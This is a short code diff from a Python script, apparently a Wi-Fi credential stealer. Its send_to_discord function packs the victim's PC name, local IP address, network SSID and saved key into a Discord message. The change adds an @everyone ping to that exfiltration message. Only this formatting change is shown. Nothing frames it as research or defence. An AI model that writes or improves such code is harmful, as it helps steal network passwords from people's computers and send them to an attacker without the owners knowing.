@@ -52,7 +52,7 @@ def send_to_discord(ssid, key_content):
     
     
     data = {
-        "content": f"**PC Name:** `{pc_name}`\n**IP Address:** `{local_ip}`\n**SSID:** `{ssid}`\n**Key Content:** `{key_content}`"
+        "content": f"**@everyone \nPC Name:** `{pc_name}`\n**IP Address:** `{local_ip}`\n**SSID:** `{ssid}`\n**Key Content:** `{key_content}`"
     }
     
     try:
